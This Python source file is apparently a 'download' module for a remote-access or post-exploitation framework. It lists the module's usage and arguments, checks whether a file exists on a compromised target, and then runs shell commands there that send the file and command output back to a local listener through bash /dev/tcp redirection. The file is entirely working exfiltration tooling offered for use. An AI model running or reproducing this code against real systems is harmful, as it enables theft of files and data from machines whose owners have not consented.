from __future__ import annotations
import os
import socket
import threading
import uuid
from koi.modules.blueprint import KoiModule


class DownloadModule(KoiModule):
    name = "download"
    description = "Download a file from the target via a dedicated TCP connection."
    usage = "download <id> <remote_path> [-o <local_path>]"
    arguments = [
        {"flags": ["remote_path"], "help": "Path of the file on the remote target"},
        {"flags": ["-o", "--output"], "default": None, "help": "Local output path"},
    ]

    def _get_local_ip(self) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((self.session.addr[0], 80))
            return s.getsockname()[0]
        finally:
            s.close()
            
    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
        local_ip = self._get_local_ip()
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
        port = srv.getsockname()[1]

        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)

        try:
            conn, _ = srv.accept()
            data = b""
            while chunk := conn.recv(4096):
                data += chunk
            conn.close()
            return data.decode("utf-8", errors="replace").strip()
        except socket.timeout:
            return ""
        finally:
            srv.close()

    def run(self) -> None:
        remote_path = self.args.remote_path
        local_path = self.args.output or os.path.basename(remote_path)
        local_ip = self._get_local_ip()
        token_ok  = uuid.uuid4().hex
        token_err = uuid.uuid4().hex
        result = self.exec(
            f"test -f {remote_path} && echo {token_ok} || echo {token_err}"
        )
        
        if result.stdout.count(token_err) >= 2:
            self.err(f"Remote file not found: {remote_path}")
            return
                
        size_str = self._exec_clean(f"wc -c < {remote_path}")
        try:
            remote_size = int(size_str.split()[0])
        except (ValueError, IndexError):
            remote_size = None

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(10)
        port = srv.getsockname()[1]

        received = []
        error    = []

        def _recv():
            try:
                conn, _ = srv.accept()
                buf = b""
                bar = self.ui.ProgressBar(total=remote_size or 0)
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    buf += chunk
                    bar.update(len(buf))
                bar.done()
                received.append(buf)
                conn.close()
            except Exception as exc:
                error.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_recv, daemon=True)
        t.start()

        self.status(
            f"Downloading {remote_path}"
            + (f" ({remote_size} bytes)" if remote_size else "")
            + "…"
        )
        self.exec(
            f"cat {remote_path} > /dev/tcp/{local_ip}/{port}",
            timeout=30,
        )

        t.join(timeout=15)
        print()

        if error:
            self.err(f"Transfer failed: {error[0]}")
            return
        if not received:
            self.err("No data received — transfer timed out.")
            return

        raw = received[0]
        try:
            with open(local_path, "wb") as f:
                f.write(raw)
        except OSError as exc:
            self.err(f"Could not write {local_path}: {exc}")
            return

        self.box("Download complete", {
            "remote path": remote_path,
            "local path":  os.path.abspath(local_path),
            "size":        f"{len(raw)} bytes  ({len(raw)/1024:.1f} KB)",
        })
